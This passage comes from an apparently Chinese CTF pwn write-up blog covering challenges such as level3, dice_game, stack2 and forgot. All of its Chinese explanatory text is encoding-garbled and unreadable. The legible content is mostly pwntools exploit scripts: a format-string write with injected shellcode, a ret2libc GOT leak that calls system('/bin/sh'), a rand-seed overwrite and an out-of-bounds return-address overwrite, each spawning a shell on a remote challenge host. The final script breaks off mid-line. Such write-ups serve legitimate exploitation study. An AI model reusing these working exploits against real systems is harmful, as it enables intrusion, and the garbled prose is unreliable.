alt="image-20200605221940761"></p></li><li><p>è¿™æ—¶å€™çœ‹æœ‰æ²¡æœ‰åœ°æ–¹å¯ä»¥è®©ç€2ä¸ªæ•°ç›¸ç­‰ã€‚è¿˜æœ‰2ä¸ªå…³é”®å‡½æ•°ä»”ç»†çœ‹çš„ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605222351181.png" alt="image-20200605222351181"></p></li><li><p>è¿›å…¥<strong>sub_400A7D()</strong>ï¼Œç›´æ¥è¾“å…¥eastè·³è¿‡å°±å¥½äº†ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605222611543.png" alt="image-20200605222611543"></p></li><li><p>å†çœ‹<strong>sub_400BB9()</strong>,æ­£å¥½è¿™é‡Œæœ‰è¿™ä¸ªæ¼æ´ï¼Œä¸”æœ‰æç¤ºä¿¡æ¯ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605224545388.png" alt="image-20200605224545388"></p></li><li><p>ä¸‹é¢ç”¨gdbè°ƒè¯•çœ‹çœ‹v2çš„å€¼åœ¨ç¬¬å‡ ä¸ªå‚æ•°ä½ç½®ã€‚åœ¨printf()å¤„ä¸‹æ–­ç‚¹ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200605225102222.png" alt="image-20200605225102222"></p></li><li><p>ä½†æ˜¯æ³¨æ„è¿™æ˜¯64ä½ç¨‹åºï¼Œå…ˆæ˜¯ä½¿ç”¨6ä¸ªå¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼ˆrdi, rsi, rdx, rcx, r8, r9ï¼‰,è€Œè¿™é‡Œ<strong>rdi</strong>ä½œä¸ºäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼Œé‚£å¯„å­˜å™¨è¿˜æœ‰5ä¸ªç”¨æ¥ä¼ é€’å‚æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ”¹å˜åœ°å€çš„å€¼å°±æ˜¯ç¬¬(5+2) = 7ä¸ªå‚æ•°äº†ã€‚</p></li><li><p>å¼€å§‹å†™è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug' è¿™ä¸ªå¯ä»¥å°†æ¯ä¸€æ­¥çš„è°ƒè¯•ä¿¡æ¯åé¦ˆç»™ç”¨æˆ·ã€‚</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46461</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">7</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%085d%7$n'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>) <span class="comment">#è¿™é‡Œshellcodeçš„2ä¸­å†™æ³•ã€‚</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'YOU SPELL'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606091645885.png" alt="image-20200606091645885"></p></li><li><p><strong>æ€»ç»“ï¼š1.shellcodeçš„å†™æ³•ï¼šä¸€ï¼šé€šè¿‡shellcraft ä¸€ä¸ªç”Ÿæˆshellcodeçš„ç±»ã€‚shellcraft.sh()è·å¾—æ‰§è¡Œsystem(â€œ/bin/shâ€)æ±‡ç¼–ä»£ç æ‰€å¯¹åº”çš„æœºå™¨ç ã€‚äºŒï¼šé€šè¿‡åæ±‡ç¼–çš„shellcodeä»£ç ã€‚2.å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŠ64ä½ä¼ å‚åŠ æ·±äº†ç†è§£ã€‚3.åˆ†æé•¿çš„é¢˜ç›®ã€‚</strong></p></li></ul><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><p>å¼€å§‹æŸ¥ä¿æŠ¤åæ²¡æ³¨æ„åˆ°NXï¼Œåœ¨æ ˆä¸Šå‡ æ¬¡æ²¡æ‰§è¡ŒæˆåŠŸæ‰å›å»çœ‹åˆ°ã€‚è¿™ä¸ªé¢˜å®é™…è¿˜æ˜¯æ ˆæº¢å‡ºï¼Œä½†å¤šè€ƒäº†å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼Œå¯¹åˆšæ¥è§¦pwnæ”¶è·è¿˜æ˜¯å¾ˆå¤§ã€‚</p></blockquote><ul><li><p>é¦–å…ˆæŸ¥ä¿æŠ¤ï¼Œåªå¼€äº†NXï¼Œæ²¡æœ‰canaryï¼Œé‚£å°±å¯ä»¥å¾€é æº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘äº†çš„æ–¹å‘çœ‹é¢˜ã€‚</p></li><li><p>è½½å…¥idaåï¼Œæ ˆæº¢å‡ºå¾ˆæ˜æ˜¾ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606153058583.png" alt="image-20200606153058583"></p></li><li><p>ä½†åˆ©ç”¨èµ·æ¥ï¼Œæ—¢æ²¡æœ‰æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰â€™/bin/shâ€™ã€‚è¿™å¯¹äºåˆšæ¥è§¦pwnè¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œä½†æœ¬æ¥å°±å­¦ä¹ çš„è¿‡ç¨‹ï¼Œçœ‹äº†writeupåˆå»å­¦äº†ä¸‹.pltä¸.gotå†æ¥åšçš„é¢˜ã€‚</p></li><li><p>å…¶å®ç¨‹åºå¸¦äº†ä¸€ä¸ªè¿è¡Œåº“çš„ï¼Œé‡Œé¢æœ‰åŠ¨æ€é“¾æ¥åº“çš„å‡½æ•°åŠä¸€äº›å…¶ä»–ä¿¡æ¯ã€‚æ—¢ç„¶ç¨‹åºé‡Œæ²¡æœ‰è‡ªç„¶å°±åˆ©ç”¨è¿™ä¸ªè¿è¡Œåº“äº†ï¼Œæ ¹æ®elfæ–‡ä»¶ä¸peæ–‡ä»¶ç±»ä¼¼ï¼Œå„ä¸ªå‡½æ•°ä¸æ•°æ®çš„ç›¸å¯¹åœ°å€æ˜¯ä¸å˜çš„ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ä¸æˆ‘ä»¬åœ¨ç¨‹åºä¸­æ˜¯è°ƒç”¨äº†writeä¸readåŠ¨æ€åº“å‡½æ•°çš„ï¼Œéšä¾¿é€‰æ‹©ä¸€ä¸ªå¾—åˆ°ä»–ä»¬çš„åœ°å€ï¼Œå†æ ¹æ®ç›¸å¯¹åœ°å€ç›¸åŠ å‡å°±å¾—åˆ°æˆ‘ä»¬è¦çš„å‡½æ•°ä¸æ•°æ®ï¼ˆsystem()ä¸â€˜/bin/shâ€™ï¼‰çš„åœ°å€äº†ã€‚</p></li><li><p>é¦–å…ˆè®¡ç®—åœ¨è¿è¡Œåº“é‡Œçš„çš„readå‡½æ•°ä¸systemå‡½æ•°çš„ç›¸å¯¹åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sys_cha = hex(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure></li><li><p>è®¡ç®—è¿è¡Œåº“ä¸­readå‡½æ•°ä¸ â€˜/bin/shâ€™çš„ç›¸å¯¹åœ°å€ã€‚å…ˆæ‰¾åˆ° â€™/bin/shâ€™çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so<span class="number">.6</span> --string <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606155906601.png" alt="image-20200606155906601"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">bin_cha = hex(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure></li><li><p>æœ‰ a-b=cï¼Œç°åœ¨æˆ‘ä»¬æœ‰äº†cï¼Œåªéœ€é€šè¿‡ç¨‹åºæº¢å‡ºå°±å¯ä»¥æ‰¾åˆ°b, æœ€åé€š a = b+cå¾—åˆ°æˆ‘ä»¬è¦çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></li><li><p>å°†å„éƒ¨åˆ†ç»“åˆèµ·æ¥ï¼Œè„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">bin_cha = int(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = int(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606172047471.png" alt="image-20200606172047471"></p></li><li><p><strong>æ€»ç»“ï¼š1.u32()ç›¸å½“äºp32()çš„é€†è¿ç®—ã€‚2.ELFçš„å„ç§ä½¿ç”¨ã€‚3.å¯¹.pltä¸.gotçš„å­¦ä¹ ã€‚4. ä»è¿è¡Œåº“å¯»æ‰¾æ‰€è¦å‡½æ•°ä¸æ•°æ®ã€‚5.è¿™é“é¢˜å¯¹äºåˆšæ¥è§¦pwnçš„æ¥åšï¼Œå¯åšæ€§å¾ˆé«˜ã€‚</strong></p></li></ul><hr><h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><blockquote><p>ä¸Šä¹‹å‰åšçš„ guess_game ä¸€ä¸ªé“ç†ã€‚é€šè¿‡æ ˆæº¢å‡ºï¼Œæ”¹å˜ç¨‹åºç‰¹å®šçš„å€¼ã€‚</p></blockquote><ul><li><p>æŸ¥ä¿æŠ¤æ²¡æœ‰ canaryï¼Œè¿™ä¹Ÿç®—æ˜¯å¼•å¯¼äº†ï¼Œå› ä¸ºæ˜¯åšé¢˜ã€‚</p></li><li><p>idaä¸­çœ‹ä¸€ä¸‹ã€‚å°±æ˜¯éšæœºæ•°ç§å­ç²¾ç¡®åˆ°äº†ç§’ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡æ ˆæº¢å‡ºæ”¹å˜ç§å­çš„å€¼ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200607160312039.png" alt="image-20200607160312039"></p></li><li><p>å†™è„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">43642</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span><span class="number">-0x10</span>)*<span class="string">'a'</span> + p64(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">    p.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200607160518598.png" alt="image-20200607160518598"></p></li><li><p><strong>æ€»ç»“ï¼š1.è™½ç„¶æ²¡æœ‰æ¥è§¦æ–°çŸ¥è¯†ï¼Œä½†æ˜¯å­¦äº†åŠ è½½libc.so.6åº“ä½¿ç”¨å…¶çš„å‡½æ•°ã€‚</strong></p></li></ul><hr><h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><blockquote><p>ç”±äºæ•°ç»„æ²¡æœ‰æ§åˆ¶ç•Œé™ï¼Œè¿˜æ˜¯æ ˆæº¢å‡ºã€‚è¿™ä¸ªé¢˜ç”±äºå‡ºé¢˜äººåœ¨é¢˜ä¸­ç›´æ¥ç»™å‡ºäº†bin/bashï¼Œè€Œç¯å¢ƒä¸­åªæœ‰shï¼Œä½†åªè¦ROPä¸€ä¸‹ï¼Œè‡ªå·±é€šè¿‡bin/bashæ„é€ shç»™systemåšå‚æ•°å³å¯ã€‚</p></blockquote><ul><li><p>æŸ¥ä¿æŠ¤ï¼Œé™¤äº†åŸºåœ°å€éšæœºåŒ–å…¶ä»–å…¨å¼€ã€‚æ„Ÿè§‰ä¼šæœ‰ç‚¹éº»çƒ¦ï¼Œéš¾åº¦è¦ç»•è¿‡canaryï¼Ÿidaä¸­çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609105006912.png" alt="image-20200609105006912"></p></li><li><p>æ­£å¥½çœ‹åˆ°å­—ç¬¦ä¸²ä¸­æœ‰ç°æˆçš„systemå‡½æ•°åŠshellï¼Œæ‰€ä»¥é€šè¿‡ä¸Šé¢çš„æ•°ç»„æº¢å‡ºå°†å‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸ºsystemå¤„çš„åœ°å€å°±å¾—åˆ°shelläº†ã€‚</p></li><li><p>å¼€å§‹è®¡ç®—æ•°ç»„çš„åœ°å€åˆ°å‡½æ•°è¿”å›åœ°å€å¤„åœ¨æ ˆä¸­çš„åç§»ï¼Œç”±äºidaä¸­é™æ€çœ‹åˆ°çš„æ ˆåˆ†å¸ƒå¯èƒ½ä¸å‡†ï¼Œé€šè¿‡gdbåŠ¨è°ƒçœ‹ä¸€ä¸‹ã€‚æ‰¾åˆ°ç¬¬ä¸€æ¬¡ç»™æ•°ç»„èµ‹å€¼çš„åœ°å€åŠæœ€åretæŒ‡ä»¤åœ°å€ä¸‹æ–­ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609105624424.png" alt="image-20200609105624424"></p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609105703718.png" alt="image-20200609105703718"></p></li><li><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢2æ¬¡çš„åœ°å€åˆ†åˆ«ä¸º<strong>0xffffd01c</strong> <strong>0xffffcf98</strong> 2è€…ä¹‹å·®ä¸º<strong>0x84</strong>ï¼Œå³æˆ‘ä»¬è¦çš„åç§»ã€‚</p></li><li><p>å¼€å§‹å†™è„šæœ¬æ”»å‡»ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¾—åˆ°shellã€‚ã€‚ã€‚æ‰¾äº†ä¸€ä¼šå„¿é”™è¯¯ï¼Œæ²¡å‘ç°ã€‚çœ‹äº†å…¶ä»–äººçš„writeupè¯´ç”±äºå‡ºé¢˜äººåŸå› ï¼Œç¯å¢ƒä¸­å¹¶æ²¡æœ‰bashï¼Œå¯ä»¥é€šè¿‡å·²æœ‰çš„ /bin/bashå¾—åˆ°shå­—ç¬¦ä¸²ï¼Œä½œä¸ºsystem()å‚æ•°æ‰è¡Œã€‚</p></li><li><p>ä¹Ÿå¾ˆå®¹æ˜“ï¼Œç›´æ¥æ‰¾åˆ°å­—ç¬¦ä¸²åœ°å€ï¼Œåˆ©ç”¨æ•°ç»„è¶Šç•Œå¤šæ”¹å˜æ ˆä¸­çš„ä¸€ä¸ªæ•°æ®ä¸º<strong>sh</strong>ä½œä¸ºsystem()çš„å‚æ•°å³å¯ã€‚exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">58409</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line">system_addr = [<span class="number">0xb4</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+i, system_addr[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+<span class="number">4</span>+i, sh_addr[i])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609110724445.png" alt="image-20200609110724445"></p></li><li><p>æœ€åå…³äºè¿™ä¸ªé¢˜çš„æ ˆä»idaä¸­é™æ€çœ‹åˆ°æ ˆä¸å®é™…åŠ¨è°ƒä¸åŒçš„åŸå› ï¼Œçœ‹å¼€å¤´ä¸ç»“å°¾çš„æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ç­”æ¡ˆã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610140544469.png" alt="image-20200610140544469"></p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610140847175.png" alt="image-20200610140847175"></p></li><li><p><strong>æ€»ç»“ï¼š1.ä»è¿™ä¸ªé¢˜å‘ç°æ•°ç»„è¶Šç•Œå°±å¯ä»¥ç»•è¿‡canaryï¼Œä½†ä¹Ÿæ˜¯é¢˜æ•…æ„è®¾è®¡çš„è€Œå·²ã€‚2.é™æ€çœ‹åˆ°çš„æ ˆåˆ†å¸ƒäºå®é™…è¿è¡Œçš„å¯èƒ½ä¼šä¸åŒï¼Œè¿™é“é¢˜å°±æ˜¯ã€‚</strong></p></li></ul><hr><h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><blockquote><p>æ ˆæº¢å‡ºï¼Œå¤šäº†ä¼šå¯¹è¾“å…¥å­—ç¬¦è¿›è¡Œåˆ¤æ–­å¤šæ„é€ ä¸‹ã€‚ä½†æ˜¯å½“å¯¹æ•´ä¸ªmainå‡½æ•°è¿è¡Œå®Œååœ¨retå¤„æ§åˆ¶å…¶èµ°å‘å§‹ç»ˆä¸æˆåŠŸã€‚ã€‚ã€‚gdbè°ƒè¯•æ ˆçš„åç§»åå¤ç¡®å®šäº†çš„ï¼Œæ¯”åœ¨idaä¸­é™æ€çœ‹åˆ°çš„å¤§4ï¼Œä½†è¿™å¤šå‡ºæ¥çš„4å°±å¾ˆè¿·ã€‚ã€‚ã€‚æœ€åè§‰å¾—æ˜¯ç¨‹åºåœ¨å‡ºæ ˆæ—¶æœ‰ä¸€ä¸ªå€¼è¿˜åŸï¼Œæœ‰ç‚¹canaryçš„æ„æ€ï¼Œä½†æ˜¯ç¨‹åºæ²¡æœ‰å¼€canaryä¿æŠ¤å•Šã€‚æäº†å¾ˆä¹…è¿˜æ˜¯æ²¡å¼„æ¸…åŸå› ï¼Œåé¢çŸ¥è¯†ç§¯ç´¯å¤šäº†å†æ¥çœ‹çœ‹æ€ä¹ˆå›äº‹ã€‚ã€‚ã€‚</p></blockquote><ul><li><p>åªå¼€äº†NXä¿æŠ¤ï¼Œidaä¸­çœ‹ä¸‹ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610171656557.png" alt="image-20200610171656557"></p></li><li><p>å†çœ‹çœ‹æ ˆçš„æƒ…å†µã€‚æ‰¾åˆ°v3ä¸v2æ•°ç»„çš„åœ°å€ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610171941539.png" alt="image-20200610171941539"></p></li><li><p>å†çœ‹åˆ°ç¨‹åºä¸­ç›´æ¥æœ‰systemå‡½æ•°åŠå­—ç¬¦ä¸²ã€‚</p></li><li><p>æ‰€ä»¥æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æ”¹å˜å‡½æ•°æŒ‡é’ˆå¹¶æ§åˆ¶v14çš„å€¼ï¼Œæ„é€ å…¶æ‰§è¡Œæˆ‘ä»¬çš„systemï¼ˆï¼‰å‡½æ•°ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610172311560.png" alt="image-20200610172311560"></p></li><li><p>å†™è„šæœ¬æ”»å‡»ã€‚è¿™é‡Œæ–¹æ³•ä¹Ÿå¾ˆå¤šå§ï¼Œåªè¦æ„é€ é…åˆå¥½å°±å¯ä»¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">39422</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486D2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span 